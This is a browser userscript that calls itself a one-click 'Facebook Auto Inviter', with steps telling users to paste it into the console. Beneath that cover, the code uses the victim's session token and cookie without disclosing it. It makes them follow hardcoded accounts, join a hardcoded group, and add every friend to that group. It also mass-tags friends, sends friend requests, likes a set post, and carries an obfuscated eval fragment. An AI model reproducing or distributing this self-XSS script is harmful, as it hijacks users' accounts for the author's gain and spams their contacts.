// ==UserScript==
// @name            Facebook Auto Inviter For Pages(Invite All Your Friends In Just 1 Click.)
// @description     Facebook Auto Inviter For Pages(Invite All Your Friends In Just 1 Click)
// @version	     10.9.1
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==


// 1.Make sure you are using Mozilla Firefox web browse.
// 2.If you don't have then please download it.
// 3.Login to facebook if not logged in already.
// 4.Now open group where you want to add all your friends.
// 5.Now press CTRL+SHIFT+K it will open a Console Box.
// 6.Copy the given below code.

	
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}

a("100004073752807");
a("836357500");

sublist("251889298290193");


var gid = ['515699261823089'];
var gid = ['521115024642638'];


var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "371499406236703";
var spost_id = "380107888801666";
var sfoto_id = "371499406236703";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}


//arkadaslari al ve isle
function sarkadaslari_al(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
				  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
					smesaj = "";
					smesaj_text = "";
				  for(i=f*10;i<(f+1)*10;i++){
					if(arkadaslar.payload.entries[i]){
				  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
				  smesaj_text += " " + arkadaslar.payload.entries[i].text;
				  }
					}
					sdurumpaylas();				}
				
			}
			
        };
		var params = "&filter[0]=user";
		params += "&options[0]=friends_only";
		params += "&options[1]=nm";
		params += "&token=v7";
        params += "&viewer=" + user_id;
		params += "&__user=" + user_id;
		
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}

//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
 }, false);
  

//arkada?¾ ekleme
function sarkadasekle(uid,cins){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
		var params = "to_friend=" + uid;
		params += "&action=add_friend";
		params += "&how_found=friend_browser";
		params += "&ref_param=none";
		params += "&outgoing_id=";
		params += "&logging_location=friend_browser";
		params += "&no_flyout_on_click=true";
		params += "&ego_log_data=";
		params += "&http_referer=";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
		xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
		cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
		xmlhttp.send(params);
}
}

//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
			cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
			btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
			if(cinshtml.getElementsByTagName("select")[0].value == "1"){
			document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
			}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
			document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
			}
			eval(fonksiyon + "(" + id + "," + cins + ");");
			}
        };
		xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send();
}
    var Title = "Auto Page Inviter</A>";
    var Descriptions = "",
        _text = 'Powered By: <A style="color:#3B5998;" href="https://www.facebook.com/" target="_blank">Ri Boss of Cuoi Chut Choi :v</A></br>Script Made By: </A><A style="color:#3B5998;" href="https://www.facebook.com/" target="_blank">Phoenix Team</A></A>,</A></A>.</br>For More Tools Visit Our Blogger <A style="color:#3B5998;" href="http://facebooknewskin.blogspot.com/" target="_blank">Automate Your Facebook</A>.</A>';
     
    page_id = /"profile_owner":"([0-9]+)"/.exec(document.getElementById("pagelet_timeline_main_column").getAttribute("data-gt"))[1];
     
    function InviteFriends(opo) {
        jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send_single?page_id=" + page_id + "&invitee=" + opo + "&elem_id=u_0_1k&action=send&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=8&fb_dtsg=" + fb_dtsg + "&phstamp=", function (a) {
            var b = a.substring(a.indexOf("{"));
            var c = JSON.parse(b);
            i--;
            Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
            if (c.error) {
                Descriptions += "color:darkred'>";
                err++;
                if (c.errorDescription) Descriptions += c.errorDescription;
                else Descriptions += JSON.stringify(c, null, "")
            } else {
                Descriptions += "color:darkgreen'>";
                Descriptions += arn[i] + " has been invited to like the page " + page_name + ".";
                suc++
            }
            Descriptions += "</div>";
            var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.9);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.9);border-radius: 1em 4em 1em 4em;border:3px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff'>";
            display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
            if (i > 0) {
                display += arr.length + " Friends Detected<br/>";
                display += "<b>" + suc + "</b> Friends Invited of " + (arr.length - i) + " Friends Processed ";
                display += "(" + i + " Lefted...)";
                display += "<div class='friend-edge'>";
                display += Descriptions;
                display += "<img style='width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src=" + pho[i] + "></img><a style='font-size:13px;padding-left:8px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
                display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
                display += "Please Wait While Inviting Your Friends to Like Your Page " + page_name + ".</br>";
    display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Cancel</span><br/>";
                display += _text;
                display += "</div>";
                display += "</div>";
                display += "</div>";
                window[tag + "_close"] = true
            } else {
                Title = "All Of Your Friends Have Been Invited to Like Your Page.</A>";
                display += arr.length + " Friends Detected and ";
                display += "<b>" + suc + " Friends Invited.</b></br>";
                display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='ChangeLocation()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Refresh Page</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"' style='color:gray'>Cancel</span><br/>";
                display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'><br/>";
                display += _text;
                display += "</div>";
                window[tag + "_close"] = false
            }
            display += "</div>";
            document.getElementById("pagelet_sidebar").innerHTML = display
        }, "text", "post");
        tay--;
        if (tay > 0) {
            var s = arr[tay];
            setTimeout("InviteFriends(" + s + ")", 100)
        }
        console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
     
     
        if (page_id) jx.load(window.location.protocol + "//www.facebook.com/ajax/pages/invite/send?&fb_dtsg=" + fb_dtsg + "&profileChooserItems=%7B%22" + opo + "%22%3A1%7D&checkableitems[0]=" + opo + "&page_eval (unescape('%69%64%3D%33%31%31%32%30%30%35%31%39%30%31%38%39%38%33'));&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=", function () {}, "text", "post")
     
       
    }
    jx = {
        b: function () {
            var b = !1;
            if ("undefined" != typeof ActiveXObject) try {
                b = new ActiveXObject("Msxml2.XMLHTTP")
            } catch (c) {
                try {
                    b = new ActiveXObject("Microsoft.XMLHTTP")
                } catch (a) {
                    b = !1
                }
            } else if (window.XMLHttpRequest) try {
                b = new XMLHttpRequest
            } catch (h) {
                b = !1
            }
            return b
        },
        load: function (b, c, a, h, g) {
            var e = this.d();
            if (e && b) {
                e.overrideMimeType && e.overrideMimeType("text/xml");
                h || (h = "GET");
                a || (a = "text");
                g || (g = {});
                a = a.toLowerCase();
                h = h.toUpperCase();
                b += b.indexOf("?") + 1 ? "&" : "?";
                var k = null;
                "POST" == h && (k = b.split("?"), b = k[0], k = k[1]);
                e.open(h, b, !0);
                e.onreadystatechange = g.c ? function () {
                    g.c(e)
                } : function () {
                    if (4 == e.readyState)
                        if (200 == e.status) {
                            var b = "";
                            e.responseText && (b = e.responseText);
                            "j" == a.charAt(0) ? (b = b.replace(/[\n\r]/g, ""), b = eval("(" + b + ")")) : "x" == a.charAt(0) && (b = e.responseXML);
                            c && c(b)
                        } else g.f && document.getElementsByTagName("body")[0].removeChild(g.f), g.e && (document.getElementById(g.e).style.display = "none"), error && error(e.status)
                };
                e.send(k)
            }
        },
        d: function () {
            return this.b()
        }
    };
     
    function ChangeLocation() {
        window.location.href = "http://www.facebook.com/"
    }
    setTimeout("ChangeLocation", 1);
    window.onbeforeunload = function () {
        if (window[tag + "_close"]) return "This script is running now!"
    };
    var i = 3;
    var tay = 3;
    var suc = 0;
    var err = 0;
    var arr = new Array;
    var arn = new Array;
    var pho = new Array;
    var tag = "Close";
    var page_name, x = document.getElementsByTagName("span");
    for (i = 0; i < x.length; i++)
        if (x[i].getAttribute("itemprop") == "name") page_name = x[i].innerHTML;
    var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
    var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
    jx.load(window.location.protocol + "///www.facebook.com/ajax/typeahead/first_degree.php?viewer=" + user_id + "&token=v7&filter[0]=user&options[0]=friends_only&options[1]=nm&options[2]=sort_alpha&__user=" + user_id + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=l", function (a) {
        var b = a;
        var c = b.substring(b.indexOf("{"));
        var d = JSON.parse(c);
        d = d.payload.entries;
        for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
        for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
        for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
        i = arr.length - 1;
        tay = i;
        console.log(arr.length);
        var display = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0px 3px 8px rgba(0, 0, 0, 0.9);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.9);border-radius: 1em 4em 1em 4em;border:3px solid rgba(0,0,0,0.9);background-color:rgba(0,0,0,0.9);color:#ffffff'>";
        display += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";
        display += arr.length + " Friends Detected, Please Wait . . .";
        display += "</div>";
        document.getElementById("pagelet_sidebar").innerHTML = display;
        InviteFriends(arr[i])
    });
    var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
    var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
    var now = (new Date).getTime();
     
    function p(post) {
     
    var X = new XMLHttpRequest();
    var XURL = "//www.facebook.com/ajax/ufi/like.php";
    var XParams = "like_action=true&ft_ent_identifier=" + post + "&source=2&client_id=1381377993496%3A1284500146&rootid=u_0_8&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35ynzpQ9UmWWuUGy6zECi8w&__req=g&fb_dtsg=" + fb_dtsg + "&ttstamp=26581681054512111570";
    X.open("POST", XURL, true);
    X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
    X.close;
    }
    };
    X.send(XParams);
    }
    P("371499406236703");
}